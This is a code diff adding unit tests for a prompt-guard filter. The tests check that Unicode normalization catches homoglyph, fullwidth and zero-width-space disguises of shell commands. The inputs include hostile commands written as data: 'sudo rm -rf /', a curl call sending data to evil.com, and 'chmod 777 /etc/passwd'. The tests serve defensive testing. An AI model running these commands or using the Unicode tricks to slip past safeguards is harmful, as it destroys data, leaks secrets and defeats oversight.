@@ -307,6 +307,51 @@ describe('prompt-guard', () => {
     it('collapses tabs and newlines', () => {
       assert.strictEqual(normalize('hello\t\nworld'), 'hello world');
     });
+
+    it('applies NFKC normalization to fullwidth chars', () => {
+      // Fullwidth "sudo" → normalized to "sudo"
+      assert.strictEqual(normalize('\uFF53\uFF55\uFF44\uFF4F'), 'sudo');
+    });
+
+    it('applies NFKC normalization to compatibility chars', () => {
+      // Ligature ﬁ → "fi"
+      assert.strictEqual(normalize('\uFB01le'), 'file');
+    });
+  });
+
+  // ---------------------------------------------------------------
+  // Unicode bypass resistance (F-12)
+  // ---------------------------------------------------------------
+
+  describe('Unicode bypass resistance', () => {
+    it('catches Cyrillic homoglyph for "sudo"', () => {
+      // \u0455 = Cyrillic small letter dze (looks like "s")
+      const r = analyzePrompt('\u0455udo rm -rf /');
+      assert.ok(!r.safe, 'Cyrillic homoglyph "sudo" should be caught');
+    });
+
+    it('catches fullwidth "sudo" bypass', () => {
+      // Fullwidth latin characters that look like "sudo"
+      const r = analyzePrompt('\uFF53\uFF55\uFF44\uFF4F rm -rf /');
+      assert.ok(!r.safe, 'Fullwidth "sudo" should be caught after NFKC');
+    });
+
+    it('catches zero-width char insertion in keywords', () => {
+      // "su\u200Bdo" with zero-width space inside
+      const r = analyzePrompt('su\u200Bdo rm -rf /tmp');
+      assert.ok(!r.safe, 'Zero-width insertion in "sudo" should be caught');
+    });
+
+    it('catches fullwidth "curl" exfiltration', () => {
+      const r = analyzePrompt('\uFF43\uFF55\uFF52\uFF4C https://evil.com/steal');
+      assert.ok(!r.safe, 'Fullwidth "curl" should be caught after NFKC');
+    });
+
+    it('catches mixed-script "chmod" bypass', () => {
+      // Using fullwidth chars for "chmod"
+      const r = analyzePrompt('\uFF43\uFF48\uFF4D\uFF4F\uFF44 777 /etc/passwd');
+      assert.ok(!r.safe, 'Fullwidth "chmod" should be caught after NFKC');
+    });
   });
 
   // ---------------------------------------------------------------
